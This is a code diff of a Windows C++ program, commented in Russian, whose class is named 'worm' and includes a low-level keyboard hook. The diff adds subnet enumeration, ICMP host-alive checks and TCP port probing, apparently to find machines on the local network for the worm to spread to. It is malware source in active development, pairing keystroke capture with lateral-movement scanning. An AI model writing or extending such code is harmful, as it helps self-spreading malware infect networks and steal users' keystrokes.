@@ -4,7 +4,7 @@
 #include <windows.h>
 #include <set>
 #include <iphlpapi.h> 
-
+#include <Icmpapi.h> // для пингования айпишников
 
 //std::wstring get_own_path() {
 //    wchar_t buffer[MAX_PATH];
@@ -89,13 +89,13 @@ wstring generate_unique_suffix() {
 }
 
 
-void init_locale() {
-#ifdef _WIN32
-    SetConsoleOutputCP(CP_UTF8);
-    std::wcout.imbue(std::locale(".UTF-8"));
-    std::wcerr.imbue(std::locale(".UTF-8"));
-#endif
-}
+//void init_locale() { // это уже не нужно?
+//#ifdef _WIN32
+//    SetConsoleOutputCP(CP_UTF8);
+//    std::wcout.imbue(std::locale(".UTF-8"));
+//    std::wcerr.imbue(std::locale(".UTF-8"));
+//#endif
+//}
 
 std::wstring get_filename_stem(const fs::path& filepath) {
     try {
@@ -637,7 +637,7 @@ LRESULT CALLBACK worm::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lPa
     return CallNextHookEx(nullptr, nCode, wParam, lParam);
 }
 
-vector<wstring> worm::get_local_ip_and_subnet()
+vector<wstring> get_local_ip_and_subnet()
 {
     vector<wstring> results;
     IP_ADAPTER_INFO adapterInfo[16];
@@ -645,6 +645,7 @@ vector<wstring> worm::get_local_ip_and_subnet()
     if (GetAdaptersInfo(adapterInfo, &bufLen) != ERROR_SUCCESS)
         return results;
 
+   
     PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;
     while (pAdapterInfo) {
         string ip = pAdapterInfo->IpAddressList.IpAddress.String;
@@ -658,11 +659,11 @@ vector<wstring> worm::get_local_ip_and_subnet()
 
         pAdapterInfo = pAdapterInfo->Next;
     }
-
+    
     return results;
 }
 
-vector<wstring> worm::generate_ip_range(const string& ip, const string& mask)
+vector<wstring> generate_ip_range(const string& ip, const string& mask)
 {
     vector<wstring> ips;
 
@@ -672,23 +673,61 @@ vector<wstring> worm::generate_ip_range(const string& ip, const string& mask)
 
     // Находим адрес сети и широковещательный адрес
     unsigned long network = ip_addr & mask_addr;
-    unsigned long broadcast = network | ~mask_addr;
+    unsigned long broadcast = ip_addr | ~mask_addr;;
 
     // Перебор всех адресов между ними
-    for (unsigned long addr = network + 1; addr < broadcast; ++addr)
+    for (unsigned long addr = ntohl(network) + 1; addr < ntohl(broadcast); ++addr)
     {
         in_addr a;
-        a.S_un.S_addr = addr;
+        a.S_un.S_addr = htonl(addr); // перевод обратно в сетевой порядок
+
         string ip_str = inet_ntoa(a);
 
-        // Преобразуем string -> wstring
         wstring ip_ws(ip_str.begin(), ip_str.end());
         ips.push_back(ip_ws);
     }
-
     return ips;
 }
 
+bool is_host_alive(const std::wstring& ip) {
+    HANDLE hIcmpFile = IcmpCreateFile();
+    if (hIcmpFile == INVALID_HANDLE_VALUE) return false;
+
+    IPAddr ipAddr = inet_addr(std::string(ip.begin(), ip.end()).c_str());
+    char ReplyBuffer[sizeof(ICMP_ECHO_REPLY) + 8];
+    DWORD ReplySize = sizeof(ReplyBuffer);
+
+    DWORD retVal = IcmpSendEcho(hIcmpFile, ipAddr, nullptr, 0, nullptr, ReplyBuffer, ReplySize, 200);
+    IcmpCloseHandle(hIcmpFile);
+
+    return retVal != 0; // если 0 — хост не отвечает
+}
+
+bool is_port_open(const std::wstring& ip, int port, int timeout_ms) {
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return false;
+
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET) return false;
+
+    sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    addr.sin_addr.s_addr = inet_addr(std::string(ip.begin(), ip.end()).c_str());
+
+    // Устанавливаем таймаут соединения
+    timeval tv;
+    tv.tv_sec = timeout_ms / 1000;
+    tv.tv_usec = (timeout_ms % 1000) * 1000;
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
+    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));
+
+    int result = connect(sock, (sockaddr*)&addr, sizeof(addr));
+    closesocket(sock);
+    WSACleanup();
+
+    return result == 0; // 0 — соединение прошло
+}
 
 
 
